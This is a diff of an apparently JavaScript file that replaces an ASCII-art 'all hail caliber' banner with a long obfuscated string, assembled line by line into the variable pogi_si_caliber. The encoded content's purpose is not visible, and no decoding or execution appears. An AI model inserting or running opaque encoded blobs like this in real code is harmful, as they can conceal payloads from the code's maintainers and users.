@@ -1,2131 +1,2441 @@
-//                             ..    .          ..                            
-//                       x .d88"    @88>  . uW8"                              
-//                        5888R     %8P   `t888                     .u    .   
-//       .         u      '888R      .     8888   .        .u     .d88B :@8c  
-//  .udR88N     us888u.    888R    .@88u   9888.z88N    ud8888.  ="8888f8888r 
-// <888'888k .@88 "8888"   888R   ''888E`  9888  888E :888'8888.   4888>'88"  
-// 9888 'Y"  9888  9888    888R     888E   9888  888E d888 '88%"   4888> '    
-// 9888      9888  9888    888R     888E   9888  888E 8888.+"      4888>      
-// 9888      9888  9888    888R     888E   9888  888E 8888L       .d888L .+   
-// ?8888u../ 9888  9888   .888B .   888&  .8888  888" '8888c. .+  ^"8888*"    
-//  "8888P'  "888*""888"  ^*888%    R888"  `%888*%"    "88888%       "Y"      
-//    "P'     ^Y"   ^Y'     "%       ""       "`         "YP'                 
-// all hail caliber                                                                        
+var pogi_si_caliber = "";
+pogi_si_caliber += "jIyDg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg42Ng4ODg4";
+pogi_si_caliber += "2Dg4ODg4ODg4ODjY2Dg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4OD";
+pogi_si_caliber += "g4ODqYyMg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4Pbg43Hm5uBg4";
+pogi_si_caliber += "ODg+Obm52Dg42D1vSbgYODg4ODg4ODg4ODg4ODg4ODg4ODg4OD";
+pogi_si_caliber += "g4ODg4ODg6mMjIODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg5abm5";
+pogi_si_caliber += "vxg4ODg4OGm/ODg4PD15ubm4ODg4ODg4ODg4ODg4ODg4ODg4OD";
+pogi_si_caliber += "g43Wg4ODg42Dg4OpjIyDg4ODg4ODjYODg4ODg4ODg9aDg4ODg4";
+pogi_si_caliber += "OEm5ub8YODg4ODg42Dg4ODg5ubm5uDg4ONg4ODg4ODg4ON1oOD";
+pogi_si_caliber += "g4ODjcebm+GDmeObwIODqYyMg4ON1sfxm5vtg4ODg4PW0Jubm9";
+pogi_si_caliber += "aNg4ODg5ubm/GDg4ODjeObm9aDg4Oam5ubjdmbm+2Dg4OD1seb";
+pogi_si_caliber += "m5ubjYODnoGbm5ubxZubm5vRg6mMjIOfm5ubhJubm8iDjeObm4";
+pogi_si_caliber += "OBm5ubm4GDg4Obm5vxg4ODhISbm5vmw4ODmpubm4ODm5ub5oOZ";
+pogi_si_caliber += "m5ubhJubm5uNg4ODl5ubm52Em5uBg4OpjIyDmpubm4OE+oGDg5";
+pogi_si_caliber += "qbm5uDg5qbm5uDg4ODm5ub8YODg4ODm5ub5oODg5qbm5uDg5ub";
+pogi_si_caliber += "m+aDx5ubm4OEm5uGgYODg5ebm5udg4SDg4ODqYyMg5qbm5uDg4";
+pogi_si_caliber += "ODg4Oam5ubg4Oam5ubg4ODg5ubm/GDg4ODg5ubm+aDg4Oam5ub";
+pogi_si_caliber += "g4Obm5vmg5ubm5uNiIGDg4ODg4OXm5ubnYODg4ODg6mMjIOam5";
+pogi_si_caliber += "ubg4ODg4ODmpubm4ODmpubm4ODg4Obm5vxg4ODg4Obm5vmg4OD";
+pogi_si_caliber += "mpubm4ODm5ub5oObm5ub74ODg4ODg4ONx5ubm++DjYiDg4OpjI";
+pogi_si_caliber += "yDnJubm5vWjY2Mg5qbm5uDg5qbm5uDg4ONm5ub4YONg4ODm5ub";
+pogi_si_caliber += "hYODjZubm5uDg5ubm4GDhJubm5vAjYONiIOD/YGbm5ubiYGDg4";
+pogi_si_caliber += "ODqYyMg4OBm5ubm/OEg4OBm5ubiYGBm5ubgYOD/Ymbm5uGg4OD";
+pogi_si_caliber += "g/Gbm5uBg4PDhpubm4mGgYODg4OBm5ubm5uGg4ODg4ODg4H6gY";
+pogi_si_caliber += "ODg4ODg6mMjIODg4OB84SDg4ODg/36gYODg/36hIODg4ODgYaD";
+pogi_si_caliber += "g4ODg4ODgYGDg4ODg4ODgcODg4ODg4ODg4OB+vOEg4ODg4ODg4";
+pogi_si_caliber += "ODg4ODg4ODg4OpjIyDws/Pg8vCys+DwMLPysHG0YODg4ODg4OD";
+pogi_si_caliber += "g4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4";
+pogi_si_caliber += "ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg6mpi4uKg56dg9ip";
+pogi_si_caliber += "hNbQxoPQ19HKwNeEmKmpqcrFi9TKzcfM1I3XwsrP1MrNx4rYqY";
+pogi_si_caliber += "OD1MrNx8zUjdfCys/Uys3HjcDMzcXKxIOeg9ipg4ODg9fLxs7G";
+pogi_si_caliber += "mYPYqYODg4ODg8bb18bNx5mD2KmDg4ODg4ODg8DMz8zR0JmD2K";
+pogi_si_caliber += "mDg4ODg4ODg4ODwc/MzMeZg9ipg4ODg4ODg4ODg4OD5+bl4vbv";
+pogi_si_caliber += "95mDhIDFxZGXkJuEj6mDg4ODg4ODg4ODg4PQzMXXmYOEgMXFlc";
+pogi_si_caliber += "GUm4SPqYODg4ODg4ODg4ODg8fKzpmDhIDBkJDCl5WEj6mDg4OD";
+pogi_si_caliber += "g4ODg4ODg4PMyJmDhIDFxZfHlsCEj6mDg4ODg4ODg4ODg4PHxs";
+pogi_si_caliber += "bTmYOEgJTCkcKQkISPqYODg4ODg4ODg4ODg8LQy5mDhICVwZeT";
+pogi_si_caliber += "l5WEj6mDg4ODg4ODg4ODg4PH1tDImYOEgJfCksKRk4Spg4ODg4";
+pogi_si_caliber += "ODg4ODg96PqYODg4ODg4ODg4PEzMzHmYOEgJfCx8abk4SPqYOD";
+pogi_si_caliber += "g4ODg4ODg4PUwtHNmYOEgMXCwMCSloSPqYODg4ODg4ODg4PO1t";
+pogi_si_caliber += "fGmYOEgJbBlsGVkISpg4ODg4ODg4Pej6mDg4ODg4ODg8XMzdfl";
+pogi_si_caliber += "ws7Kz9qZg9ipg4ODg4ODg4ODg87MzcyZg/iEgeDC0MDCx8rCg+";
+pogi_si_caliber += "DMx8aBhI+DhODMzdDMz8LQhI+DhIHv1sDKx8KD4MzN0MzPxoGE";
+pogi_si_caliber += "j4OE1sqOzszNzNDTwsDGhI+DhM7MzczQ08LAxoT+qYODg4ODg4";
+pogi_si_caliber += "OD3qmDg4ODg4PeqYODg4PeqYOD3pip3qmpwMzN0NeDxtDAg56D";
+pogi_si_caliber += "0IOenYPw19HKzcSL0IOenoPN1s/Pg5yDhISDmYPQio3RxtPPws";
+pogi_si_caliber += "DGi4z4hZ+dgYT+jMSPg8CDnp2Di9iEhYSZhIXCztOYhI+En4SZ";
+pogi_si_caliber += "hIXP15iEj4SdhJmEhcTXmISPhIGEmYSF0tbM15iEj4GEgZmEhY";
+pogi_si_caliber += "CQmpiE3vjA/oqKmKmpwMzN0NeD4Ozt5erkg56Dqdipg4PQytfG";
+pogi_si_caliber += "7cLOxpmDhPfL0cbC15HwzMDKxtfahI+pqYODwMzT2pmD2KmDg4";
+pogi_si_caliber += "ODy8bRzPfCxM/KzcaZg4ODg4ODg4OE18vG2oPLwtfGg9bQg8DW";
+pogi_si_caliber += "2YPXy8bag8LKzdeD1tCEj6mDg4ODy8zF8NbB18rXz8aZg4ODg4";
+pogi_si_caliber += "ODg4ODgcHG14PazNaDwMLNhNeDwcaD1tCBj6mDg4ODwcrE98vR";
+pogi_si_caliber += "xsLX0PDWwdfK18/GmYODhMrNxMLXg9DCg87EwoPXzIPBwsjCg9";
+pogi_si_caliber += "PC18Lays2DyMKDzcrPwoSPqYODg4POxs7BxtHQ8NbB18rXz8aZ";
+pogi_si_caliber += "g4ODg4OEzsTCg8HC1MLPg8HC18LLys2Ej6mDg4ODxMzHzszXy8";
+pogi_si_caliber += "bR0PDWwdfK18/GmYODhNfLxoPMzcbQg9TLzIPOwsfGg9bQhI+p";
+pogi_si_caliber += "g4Pej6mpg4Opg4PHytDAzNHH6s3VytfGmYPYqYODg4PNws7GmY";
+pogi_si_caliber += "OE98vRxsLXkfDMwMrG19qEj6mDg4OD1tHPmYOEy9fX09CZjIzH";
+pogi_si_caliber += "ytDAzNHHjcTEjM3t9Jv04dfb5NSEj6mDg96PqamDg9fG0c7Kzc";
+pogi_si_caliber += "LPmYPYqYODg4PW0MbRmYOE15HQhI+pg4ODg8vM0NeZg4TAws/K";
+pogi_si_caliber += "wcbRhI+pg4ODg9DXwtfW0JmDhPDXwtfW0JmD0MrPxs3Xg8HW14";
+pogi_si_caliber += "PAws2DwcaD18vGg9HGwtDMzYPMxYPazNbRg83KxMvXzsLRxoSP";
+pogi_si_caliber += "qYODg4PCwczW15mD+KmDg4ODg4OE0NfC0dfGx4PC0IPCg9DOws";
+pogi_si_caliber += "/Pg8DK0cDPxoPWzdfKz4PK14PBxsDCzsaDzM3Gg8zFg9fLxoPO";
+pogi_si_caliber += "zNDXg8vC18bHg83CzsbQg8rNg9fLxoPC0cbChI+pg4ODg/6PqY";
+pogi_si_caliber += "ODg4PRzNDXxtGZg/ipg4ODg4ODhMbVxtHawczH2oPUws3NwoPB";
+pogi_si_caliber += "xoPW0I+DwdbXg9fLxtqDwMLN14PBxoPW0ISPqYODg4P+j6mDg9";
+pogi_si_caliber += "6PqamDg8LQwMrK4tHXmYPDg4ODg4PQg4ODg4ODg4ODg4ODg4OD";
+pogi_si_caliber += "g4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4";
+pogi_si_caliber += "ODg4OD0IODg4ODg4ODg4ODg4ODg4ODg4ODg4ON24iemY2Dg4OD";
+pogi_si_caliber += "g4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODjYODg4ODg4ODg4ODg4";
+pogi_si_caliber += "ODg4ODg4OD0IODg4ODg4ODg4ODg4ODg4ODqYODg4OZm4ODg4OD";
+pogi_si_caliber += "g43WxsX9gYODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4";
+pogi_si_caliber += "ODg4ODg4ODg4ODg4ODmZuDg4ODg4ONjo7didfG1o2Dg4ODg4PZ";
+pogi_si_caliber += "/8ODg4OD/YaDg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg+Obm5";
+pogi_si_caliber += "2Dg4ODg4ODg4ODg4ODg4ODg5mbg4ODg4ODjY2Dg4ODg4ODg4Op";
+pogi_si_caliber += "g4ODjZubg4ODg5nHm5vmg4ODg4ODg4ODg43Wg4ODg42Dg4ODg4";
+pogi_si_caliber += "ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg42bm4ODg4ODx+WDg4OD";
+pogi_si_caliber += "g5qbm+3bg4ODg4ODg42Dg4OfyIODg4ODg4OD1o2Dg4ODg4ODg4";
+pogi_si_caliber += "ODg4ODg4OGm/ODg4ODg4ODg4ODg4ODg4ODg42bm4ODg4OD4++D";
+pogi_si_caliber += "g4ODg4ODg4ODqYODmZubm8zMzIP/w5ubm+aDg4ODg4ODg43Hm5";
+pogi_si_caliber += "vhg5njm8CDg4ODg4ODjdaDg4ODg4ODg4OD1oODg4ODg4OZm5ub";
+pogi_si_caliber += "zMzMg8ebm5vBg4OD/8Obm5ubnYODg4ON45vtxsebgYODjY2N1s";
+pogi_si_caliber += "abm5vBg4ODg4ODg4ONg4ODg4ODjYODg4ODg4ODg43Wg4ODg4OD";
+pogi_si_caliber += "mZubm8zMzIOam5ubyoODg43H74ODqY6Jm5ubm5ubm4ODm5ub5o";
+pogi_si_caliber += "ON2ZvIg4OegZubm5vFm5ubm9GDg4PWx5ubm5uNg4ODg4PW0Jub";
+pogi_si_caliber += "m9aNg4OOiZubm5ubm5uDnJubm5udg4Oam5ubm+WDg43j/Yabm5";
+pogi_si_caliber += "ubgYODg5ubm/GD+pubm9GDg43Wx/Gbm+2Dg4ON45ub1oODg4PW";
+pogi_si_caliber += "x5ubm5uNg4OOiZubm5ubm5uD/8P6m5ubyJmJm5ubjYOpg4Obm5";
+pogi_si_caliber += "ubg4ODg4Obm5vm3Zybm5vvg4ODl5ubm52Em5uBg4OZm5ubhJub";
+pogi_si_caliber += "m5uNg43jm5uDgZubm5uBg4ODm5ubm4ODg4ODgYmJgYOD25ubm5";
+pogi_si_caliber += "ub3YPbm5uZg4P/w4qbwY2Dg5ubm/GD6pubm52Dn5ubm4Sbm5vI";
+pogi_si_caliber += "g4SEm5ub5v/Dg5mbm5uEm5ubm42Dg4Obm5ubg4ODg4ODm5ub5o";
+pogi_si_caliber += "ODm5ub6oOpg4Obm5ubg4ODg4Obm5vmg4Obm5vmg4ODl5ubm52D";
+pogi_si_caliber += "hIODg4PHm5ubg4Sbm4aBg5qbm5uDg5qbm5uDg4ODm5ubm4ODg4";
+pogi_si_caliber += "ODg4ODg4PHm5ubm4n/w4ODm5ubm+2eiZubm5uDg5ubm/GD6pub";
+pogi_si_caliber += "m52Dmpubm4OE+oGDg4ODm5ub5oODx5ubm4OEm5uGgYODg5ubm5";
+pogi_si_caliber += "uDg4ODg4Obm5vmg4Obm5vqg6mDg5ubm5uDg4ODg5ubm+aDg5ub";
+pogi_si_caliber += "m+aDg4OXm5ubnYODg4ODg5ubm5uNiIGDg4ODmpubm4ODmpubm4";
+pogi_si_caliber += "ODg4Obm5ubg4ODg4ODg4PZm4mJgf/Dg4ODmYODhpuBg4ODg/Gb";
+pogi_si_caliber += "m4ODm5ub8YPqm5ubnYOam5ubg4ODg4ODg4Obm5vmg4Obm5ubjY";
+pogi_si_caliber += "iBg4ODg4ODm5ubm4ODg4ODg5ubm+aDg5ubm+qDqYONm5ubm+/W";
+pogi_si_caliber += "noODm5ub5oODm5ub5oODjcebm5vvg42Ig4ODm5ubm++Dg4ODg4";
+pogi_si_caliber += "Oam5ubg4Oam5ubg4ODjZubm5vv1p6Dg4OZnI2NjY2Ng4ONjeWD";
+pogi_si_caliber += "g4Pjm/TM1oOahoOD1pubm5vA6Zubm4ODmpubm4ODg4ODg4ODm5";
+pogi_si_caliber += "ub5oODm5ubm++Dg4ODg4ODjZubm5vv1p6Dg4Obm5vmg4Obm5vq";
+pogi_si_caliber += "g6mD/Yabm5uJg4ODg5ubm+aDg5ubm+aDg/2Bm5ubm4mBg4ODg4";
+pogi_si_caliber += "Sbm5ubwI2DjYiDmpubm4ODmpubm4ODg/2Gm5ubiYODg4OfgYGb";
+pogi_si_caliber += "m5ubm5ubm5vdg42bm5ubm5vz/8ODg4ODgYmbm5uJ84GDg4Ocm5";
+pogi_si_caliber += "ubm9aNjYyDg4Obm5uFg4OEm5ubm8CNg42Ig4P9hpubm4mDg4OD";
+pogi_si_caliber += "25ubm+2dn5ubm4SDqYODg4T6gYODg4POm5ub7Z6Dm5ubnYODg4";
+pogi_si_caliber += "ODgfqBg4ODg4ODg4Gbm5ubm4aDg4OBm5ubiYGBm5ubgYODg4OE";
+pogi_si_caliber += "+oGDg4ODg5uZg4OBm5ubm5ubiYOD/8ODg4P9geWDg4ODg4ODg4";
+pogi_si_caliber += "T6gYODg4ODg4OBm5ubm/OEg4ODg/Gbm5uBg4OBm5ubm5uGg4OD";
+pogi_si_caliber += "g4ODhPqBg4ODg4ODgZubgYODm5ubg4Opg4ODg4ODg4ODg4P/w/";
+pogi_si_caliber += "qBg4ODm5ubg4ODg4ODg4ODg4ODg4ODg4ODgfrzhIODg4OD/fqB";
+pogi_si_caliber += "g4OD/fqEg4ODg4ODg4ODg4ODg4GBg4ODg4GJiYH/w4ODg4ODg4";
+pogi_si_caliber += "ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4HzhIODg4ODg4OBgYOD";
+pogi_si_caliber += "g4ODg4H684SDg4ODg4ODg4ODg4ODg4ODg4ODg4ODm5vlg4Opg4";
+pogi_si_caliber += "ODg4ODg4ODg4ODg4ODg+mbm4GDg4ODg4ODg4ODg4ODg4ODg4OD";
+pogi_si_caliber += "g4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4";
+pogi_si_caliber += "ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4OD";
+pogi_si_caliber += "g4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4";
+pogi_si_caliber += "ODmpuBg4ODqYODg4ODg4ODg4ODg4ODg4PjhoODg4ODg4ODg4OD";
+pogi_si_caliber += "g4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4";
+pogi_si_caliber += "ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4OD";
+pogi_si_caliber += "g4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4";
+pogi_si_caliber += "ODg4ODg4ODg4ONjIGDg4ODg6mDg4ODg4ODg4ODg4ODg5mBg4OD";
+pogi_si_caliber += "g4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4";
+pogi_si_caliber += "ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4OD";
+pogi_si_caliber += "g4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4";
+pogi_si_caliber += "ODg4ODg4ODg4ODg4ODg4ODg4Pd/8PDj6mpg4PBxOLQwMrKmYPD";
+pogi_si_caliber += "g4ODg4ODg4ODg4ODYCFhFWAhYRVgIWEVYCFhFWAhYRVgIWEVYC";
+pogi_si_caliber += "FhFWAhYRVgIWEVYCFhFWAhYRVgIWEVYCFhFWAhYRWDg4ODg4OD";
+pogi_si_caliber += "g4ODg4ODg4ODg4Opg4ODg4ODg4NgIWEVYCFhFWAhYRVgIWEVg4";
+pogi_si_caliber += "ODg4ODg4ODg4ODg2AhYRVgIWEVYCFhFWAhYRVgIWEVg4ODg4OD";
+pogi_si_caliber += "g4ODg4ODg4Opg4ODg4ODg2AhYRVgIWEVYCFhFYODg4ODg4ODg4";
+pogi_si_caliber += "ODg4ODg4ODg4NgIWEVYCFhFWAhYRVgIWEVg4ODg4ODg4ODg6mD";
+pogi_si_caliber += "g4ODg4NgIWEVYCFhFWAhYRVgIWEVg4ODg4ODg4ODg4ODg4ODg4";
+pogi_si_caliber += "ODg4ODg2AhYRVgIWEVYCFhFYODg4ODg4ODqYODg4ODYCFhFWAh";
+pogi_si_caliber += "YRWDg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg2AhYRVgIWEVYC";
+pogi_si_caliber += "FhFYODg4ODg6mDg4ODYCFhFWAhYRWDg4ODg4ODg4ODg4ODg4OD";
+pogi_si_caliber += "g4ODg4ODg4ODg4ODg4NgIWEVYCFhFYODg4ODqYODg2AhYRVgIW";
+pogi_si_caliber += "EVg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg2AhYRVg";
+pogi_si_caliber += "IWEVg4ODg6mDg4NgIWEVg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4";
+pogi_si_caliber += "ODg4ODg4ODg4ODg2AhYRWDg4Opg4NgIWEVYCFhFYODg4ODg4OD";
+pogi_si_caliber += "g4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4NgIWEVYCFhFYODqY";
+pogi_si_caliber += "NgIWEVYCFhFYODg4ODg4ODg4NgIWEVYCFhFWAhYRWDg4ODg4OD";
+pogi_si_caliber += "g4ODg4ODg4ODg4ODg4ODg2AhYRWDg6mDg2AhYRWDg4ODg4ODg4";
+pogi_si_caliber += "NgIWEVYCFhFYODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODYCFh";
+pogi_si_caliber += "FWAhYRWDqYODYCFhFYODg4ODg4ODg2AhYRWDg4ODg4ODg4ODg4";
+pogi_si_caliber += "ODg4NgIWEVYCFhFWAhYRWDg4ODg4ODg4NgIWEVYCFhFYOpg4Ng";
+pogi_si_caliber += "IWEVg4ODg2AhYRVgIWEVg2AhYRVgIWEVg2AhYRVgIWEVYCFhFW";
+pogi_si_caliber += "AhYRVgIWEVg2AhYRWDg4ODg4ODg4ODYCFhFWAhYRVgIWEVg4OD";
+pogi_si_caliber += "g4ODg4NgIWEVg6mDg2AhYRWDg4ODg4ODg2AhYRWDg4NgIWEVYC";
+pogi_si_caliber += "FhFWAhYRVgIWEVYCFhFWAhYRVgIWEVYCFhFWAhYRVgIWEVg4OD";
+pogi_si_caliber += "g2AhYRVgIWEVYCFhFYODg4ODg4ODYCFhFYOpg4NgIWEVYCFhFY";
+pogi_si_caliber += "ODg4ODYCFhFWAhYRVgIWEVYCFhFYODYCFhFWAhYRVgIWEVYCFh";
+pogi_si_caliber += "FWAhYRVgIWEVYCFhFWAhYRVgIWEVYCFhFWAhYRVgIWEVg4NgIW";
+pogi_si_caliber += "EVYCFhFWAhYRWDYCFhFWAhYRWDg4NgIWEVYCFhFWAhYRWpg4Ng";
+pogi_si_caliber += "IWEVYCFhFYODg2AhYRVgIWEVYCFhFWAhYRVgIWEVYCFhFYODYC";
+pogi_si_caliber += "FhFWAhYRVgIWEVYCFhFWAhYRVgIWEVYCFhFWAhYRVgIWEVYCFh";
+pogi_si_caliber += "FWAhYRVgIWEVYCFhFWAhYRWDYCFhFWAhYRVgIWEVYCFhFWAhYR";
+pogi_si_caliber += "VgIWEVYCFhFYNgIWEVYCFhFYOpg4NgIWEVg4ODYCFhFWAhYRVg";
+pogi_si_caliber += "IWEVYCFhFWAhYRVgIWEVYCFhFYODg2AhYRVgIWEVYCFhFWAhYR";
+pogi_si_caliber += "VgIWEVYCFhFWAhYRVgIWEVYCFhFWAhYRVgIWEVYCFhFWAhYRVg";
+pogi_si_caliber += "IWEVg2AhYRVgIWEVYCFhFWAhYRVgIWEVYCFhFWAhYRVgIWEVYC";
+pogi_si_caliber += "FhFWAhYRWDg6mDYCFhFWAhYRWDg2AhYRVgIWEVYCFhFWAhYRVg";
+pogi_si_caliber += "IWEVYCFhFWAhYRVgIWEVg4ODYCFhFWAhYRVgIWEVYCFhFWAhYR";
+pogi_si_caliber += "VgIWEVYCFhFWAhYRVgIWEVYCFhFWAhYRVgIWEVYCFhFWAhYRWD";
+pogi_si_caliber += "YCFhFWAhYRVgIWEVYCFhFWAhYRVgIWEVYCFhFWAhYRVgIWEVYC";
+pogi_si_caliber += "FhFWAhYRWDg6mDg4ODYCFhFWAhYRVgIWEVYCFhFWAhYRVgIWEV";
+pogi_si_caliber += "YCFhFWAhYRVgIWEVYCFhFYODg4NgIWEVYCFhFWAhYRVgIWEVYC";
+pogi_si_caliber += "FhFWAhYRVgIWEVYCFhFWAhYRVgIWEVYCFhFYNgIWEVYCFhFWAh";
+pogi_si_caliber += "YRVgIWEVYCFhFWAhYRVgIWEVYCFhFWAhYRVgIWEVg4Opg4ODg4";
+pogi_si_caliber += "ODYCFhFWAhYRVgIWEVYCFhFWAhYRVgIWEVYCFhFYODYCFhFWAh";
+pogi_si_caliber += "YRWDg4ODYCFhFWAhYRVgIWEVYCFhFWAhYRVgIWEVYCFhFWAhYR";
+pogi_si_caliber += "VgIWEVg4ODYCFhFWAhYRVgIWEVYCFhFWAhYRVgIWEVYCFhFWAh";
+pogi_si_caliber += "YRVgIWEVYCFhFYODqYODg4ODg2AhYRWDg2AhYRVgIWEVYCFhFY";
+pogi_si_caliber += "ODg2AhYRVgIWEVYCFhFYODg4ODg4ODg4ODg4ODg4ODYCFhFWAh";
+pogi_si_caliber += "YRVgIWEVYCFhFWAhYRVgIWEVYCFhFYODg6mDg4ODg2AhYRVgIW";
+pogi_si_caliber += "EVg4ODg4ODg2AhYRVgIWEVYCFhFWAhYRVgIWEVYCFhFYNgIWEV";
+pogi_si_caliber += "g4ODg4ODg4ODg4ODg4ODYCFhFWAhYRVgIWEVg4ODg4Opg4ODg4";
+pogi_si_caliber += "NgIWEVYCFhFYODg4ODYCFhFWAhYRVgIWEVg4ODg2AhYRVgIWEV";
+pogi_si_caliber += "YCFhFWAhYRWDg4ODg4ODg4ODg2AhYRVgIWEVYCFhFWAhYRWDg4";
+pogi_si_caliber += "ODg4ODqYODg4ODg2AhYRVgIWEVg4ODg4NgIWEVg4ODg4ODYCFh";
+pogi_si_caliber += "FWAhYRWDg4ODg4ODg2AhYRVgIWEVYCFhFWAhYRVgIWEVYCFhFW";
+pogi_si_caliber += "AhYRVgIWEVYCFhFYODg4ODg6mDg4ODg4ODYCFhFWAhYRVgIWEV";
+pogi_si_caliber += "YCFhFWAhYRWDg4ODg4ODg4ODYCFhFYODYCFhFYNgIWEVYCFhFW";
+pogi_si_caliber += "AhYRVgIWEVYCFhFWAhYRVgIWEVYCFhFWAhYRVgIWEVYCFhFYOD";
+pogi_si_caliber += "g4ODg4Opg4ODg4ODg4ODg2AhYRVgIWEVYCFhFYODg2AhYRVgIW";
+pogi_si_caliber += "EVYCFhFWAhYRWDYCFhFWAhYRWDYCFhFWAhYRVgIWEVg4NgIWEV";
+pogi_si_caliber += "YCFhFWAhYRVgIWEVYCFhFYODYCFhFWAhYRWDg4ODg4ODqYODg4";
+pogi_si_caliber += "ODg4ODg4ODYCFhFWAhYRVgIWEVYCFhFWAhYRWDYCFhFYODYCFh";
+pogi_si_caliber += "FWAhYRWDYCFhFYNgIWEVg2AhYRWDg4NgIWEVYCFhFYODg4NgIW";
+pogi_si_caliber += "EVg4ODg4ODg6mDg4ODg4ODg4ODg4NgIWEVg4ODg4ODg4ODg2Ah";
+pogi_si_caliber += "YRVgIWEVg4ODg2AhYRWDg4ODg2AhYRWDg4ODg4ODqYODg4ODg4";
+pogi_si_caliber += "ODg4ODg4NgIWEVYCFhFWAhYRVgIWEVYCFhFYNgIWEVYCFhFWAh";
+pogi_si_caliber += "YRVgIWEVYCFhFWAhYRWDg4ODg4ODYCFhFWAhYRWDg4ODYCFhFY";
+pogi_si_caliber += "ODg4ODg4Opg4ODg4ODg4ODg4ODg4ODg4ODYCFhFWAhYRVgIWEV";
+pogi_si_caliber += "YCFhFWAhYRVgIWEVg4ODg4ODg4ODg2AhYRWDg4ODYCFhFYODg4";
+pogi_si_caliber += "ODg4Opg4ODg4ODg4ODg4ODg4ODg4ODg2AhYRVgIWEVg2AhYRVg";
+pogi_si_caliber += "IWEVg4ODg4ODg4ODg2AhYRVgIWEVg4NgIWEVYCFhFYODg4ODg4";
+pogi_si_caliber += "Opg4ODg4ODg4ODg4ODg4ODg4ODg4NgIWEVYCFhFWAhYRVgIWEV";
+pogi_si_caliber += "YCFhFYODg4ODg4ODg4NgIWEVg4ODg2AhYRWDg4ODg4ODqYODg4";
+pogi_si_caliber += "ODg4ODg4ODg4ODg4ODg4ODg2AhYRVgIWEVYCFhFWAhYRVgIWEV";
+pogi_si_caliber += "g4ODg4ODg4NgIWEVYCFhFYODg4NgIWEVYCFhFYODg4ODg6mDg4";
+pogi_si_caliber += "ODg4ODg4ODg4ODg4ODg4ODg4NgIWEVYCFhFWAhYRVgIWEVYCFh";
+pogi_si_caliber += "FYODg4ODg4NgIWEVg2AhYRWDg4ODg2AhYRWDg4ODg4Opg4ODg4";
+pogi_si_caliber += "ODg4ODg4ODg4ODg4ODg4ODYCFhFYNgIWEVYCFhFWAhYRWDg4OD";
+pogi_si_caliber += "g4NgIWEVg4NgIWEVYCFhFYODg4NgIWEVg4ODg4ODqYODg4ODg4";
+pogi_si_caliber += "ODg4ODg4ODg4ODg4ODg2AhYRVgIWEVYCFhFWAhYRVgIWEVg4OD";
+pogi_si_caliber += "g4NgIWEVYCFhFYODYCFhFWAhYRWDg2AhYRWDg4ODg4ODqYODg4";
+pogi_si_caliber += "ODg4ODg4ODg4ODg4ODg4ODg2AhYRVgIWEVYCFhFWAhYRVgIWEV";
+pogi_si_caliber += "g4ODYCFhFWAhYRVgIWEVg4NgIWEVYCFhFYODYCFhFYODg4ODg4";
+pogi_si_caliber += "Opg4ODg4ODg4ODg4ODg4ODg4ODg4ODg2AhYRVgIWEVYCFhFWAh";
+pogi_si_caliber += "YRVgIWEVYCFhFWAhYRWDg2AhYRVgIWEVYCFhFYODg2AhYRVgIW";
+pogi_si_caliber += "EVg4ODg4ODg6mDg4ODg4ODg4ODg4ODg4ODg4ODg4ODg2AhYRVg";
+pogi_si_caliber += "IWEVg4ODg2AhYRVgIWEVYCFhFYODg4NgIWEVg4ODg4ODg4ODg6";
+pogi_si_caliber += "mDg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4NgIWEVYCFhFWAh";
+pogi_si_caliber += "YRVgIWEVg4ODg4NgIWEVg4ODg4ODg4ODg6mDg4ODg4ODg4ODg4";
+pogi_si_caliber += "ODg4ODg4ODg4ODg4ODg4ODg2AhYRVgIWEVg4ODg2AhYRVgIWEV";
+pogi_si_caliber += "g4ODg4ODg4ODg6mDg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4ODg4";
+pogi_si_caliber += "ODg4NgIWEVYCFhFWAhYRVgIWEVYCFhFWAhYRVgIWEVw4+pqYOD";
+pogi_si_caliber += "zsLKzffL0cbC19CZg/ipg4ODg9iDzcLOxpmEx8LZhI+DztbQys";
+pogi_si_caliber += "CZhNPFjMfC2Y3O05CEj4PBwsDIxNHM1s3HmYTTxYzHwtmNxMrF";
+pogi_si_caliber += "hI+Dx8rQwMzRx+rHmYSSlpGSm5qTlJGbk5qXkZObkpGRhIPej6";
+pogi_si_caliber += "mDg4OD2IPNws7GmYTAws/KwcbRhI+DztbQysCZhNPFjMDCz8rB";
+pogi_si_caliber += "xtGNztOQhI+DwcLAyMTRzNbNx5mDhNPFjMDCz8rBxtGNxMrFhI";
+pogi_si_caliber += "+Dx8rQwMzRx+rHmYSSlpKRlZSWlJaWl5aalZKRm5CWhIPej6mD";
